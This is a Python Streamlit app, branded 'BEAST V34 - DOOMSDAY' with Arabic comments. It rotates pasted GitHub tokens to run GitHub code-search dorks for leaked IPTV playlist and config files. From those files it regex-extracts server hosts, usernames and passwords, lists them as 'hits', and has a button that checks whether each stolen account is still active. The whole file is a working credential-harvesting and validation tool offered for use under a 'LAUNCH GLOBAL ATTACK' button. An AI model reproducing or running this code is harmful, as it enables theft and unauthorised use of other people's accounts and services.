import streamlit as st
import requests
import re
import time
import threading
from queue import Queue

# --- إعدادات القوة القصوى ---
st.set_page_config(page_title="BEAST V34 - DOOMSDAY", layout="wide")

# تهيئة المخزن المؤقت للنتائج لضمان السرعة
if "hits_queue" not in st.session_state: st.session_state.hits_queue = []
if "auth" not in st.session_state: st.session_state.auth = False

# نظام الدخول الإجباري
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#ff0000;'>💀 BEAST V34 - DOOMSDAY EDITION</h1>", unsafe_allow_html=True)
    col_login, _ = st.columns([1, 2])
    with col_login:
        pwd = st.text_input("PASSWORD:", type="password")
        if st.button("ACTIVATE SYSTEM"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
    st.stop()

# تصميم الواجهة (Terminal Style)
st.markdown("""
<style>
    .stApp { background-color: #000; color: #00ff41; }
    .hit-card { 
        background: #050505; border: 1px solid #111; border-left: 4px solid #ff0000;
        padding: 12px; margin-bottom: 8px; font-family: 'Courier New', monospace;
    }
    .log-text { color: #00d4ff; font-size: 11px; }
    .stat-val { color: #ff0000; font-weight: bold; font-size: 20px; }
</style>
""", unsafe_allow_html=True)

# --- المحرك الانفجاري ---
def doomsday_engine(tokens_list):
    # دروكات "عدوانية" لجلب كميات هائلة
    mega_queries = [
        'extension:m3u8 "http"', 'extension:txt "get.php?username="', 
        'extension:php "panel_api.php"', 'filename:config.php "username" "password" "http"',
        '"type=m3u_plus"', '"output=ts"', 'extension:json "server_url"',
        'extension:txt "port" "password" "username" "http"'
    ]
    
    t_idx = 0
    num_tokens = len(tokens_list)
    
    for query in mega_queries:
        for page in range(1, 30): # زيادة عدد الصفحات لـ 30 لزيادة النتائج
            try:
                token = tokens_list[t_idx % num_tokens]
                headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
                
                # طلب البحث بسرعة عالية
                api_url = f"https://api.github.com/search/code?q={query}&page={page}&per_page=100&sort=indexed"
                response = requests.get(api_url, headers=headers).json()
                
                if "items" not in response:
                    t_idx += 1 # تبديل التوكن فوراً عند أي تأخير
                    continue
                
                for item in response['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=2).text
                        # صيد الروابط باستخدام Regex فائق السرعة
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for host, user, pw in matches:
                            # إضافة النتيجة للمخزن المؤقت فوراً دون انتظار الفحص لزيادة السرعة
                            hit_data = {"host": host, "user": user, "pw": pw, "time": datetime.now().strftime("%H:%M:%S")}
                            if hit_data not in st.session_state.hits_queue:
                                st.session_state.hits_queue.insert(0, hit_data)
                    except: continue
            except:
                t_idx += 1
                continue

# --- واجهة المستخدم الرئيسية ---
st.title("📟 BEAST V34 LIVE TERMINAL")

with st.sidebar:
    st.header("🎮 COMMAND CENTER")
    tokens_area = st.text_area("PASTE TOKENS HERE (ONE PER LINE):", height=200, placeholder="ghp_xxx...\nghp_yyy...")
    
    if st.button("🔥 LAUNCH GLOBAL ATTACK"):
        tokens = [t.strip() for t in tokens_area.split('\n') if t.strip()]
        if tokens:
            # تشغيل المحرك في خيط منفصل (Background Thread)
            threading.Thread(target=doomsday_engine, args=(tokens,), daemon=True).start()
            st.success("ENGINE STARTED! WATCH THE FEED.")
        else: st.error("NO TOKENS FOUND!")

    st.divider()
    st.write(f"📊 TOTAL HITS: <span class='stat-val'>{len(st.session_state.hits_queue)}</span>", unsafe_allow_html=True)
    if st.button("🗑️ CLEAR LIST"):
        st.session_state.hits_queue = []
        st.rerun()

# --- العرض المباشر (LIVE FEED) ---
from datetime import datetime

st.subheader("🛰️ LIVE INCOMING DATA STREAM")
if not st.session_state.hits_queue:
    st.warning("WAITING FOR DATA... MAKE SURE TOKENS ARE VALID.")
else:
    # عرض النتائج فوراً
    for hit in st.session_state.hits_queue:
        st.markdown(f"""
        <div class="hit-card">
            <div style="display:flex; justify-content:space-between;">
                <span style="color:#ff0000; font-weight:bold;">[NEW HIT]</span>
                <span style="color:#444;">{hit['time']}</span>
            </div>
            <div style="margin-top:8px;">
                <b style="color:#00d4ff;">HOST:</b> <span style="color:#fff;">{hit['host']}</span><br>
                <b style="color:#00d4ff;">USER:</b> <span style="color:#fbbf24;">{hit['user']}</span> | 
                <b style="color:#00d4ff;">PASS:</b> <span style="color:#fbbf24;">{hit['pw']}</span>
            </div>
            <div style="margin-top:10px; font-size:10px;">
                <code style="background:#111; color:#555; padding:3px;">{hit['host']}/get.php?username={hit['user']}&password={hit['pw']}&type=m3u_plus&output=ts</code>
            </div>
        </div>
        """, unsafe_allow_html=True)
        # خيار فحص سريع لكل سيرفر يظهر
        if st.button(f"⚡ FAST CHECK #{hit['host'][:15]}", key=hit['host']+hit['user']):
            try:
                check_url = f"{hit['host']}/player_api.php?username={hit['user']}&password={hit['pw']}"
                r = requests.get(check_url, timeout=3).json()
                if r.get("user_info", {}).get("status") == "Active":
                    st.success(f"SERVER IS ALIVE! Expiry: {r['user_info'].get('exp_date')}")
                else: st.error("SERVER EXPIRED.")
            except: st.error("CONNECTION FAILED.")

# تحديث الصفحة تلقائياً كل 5 ثوانٍ لرؤية النتائج الجديدة
time.sleep(5)
st.rerun()
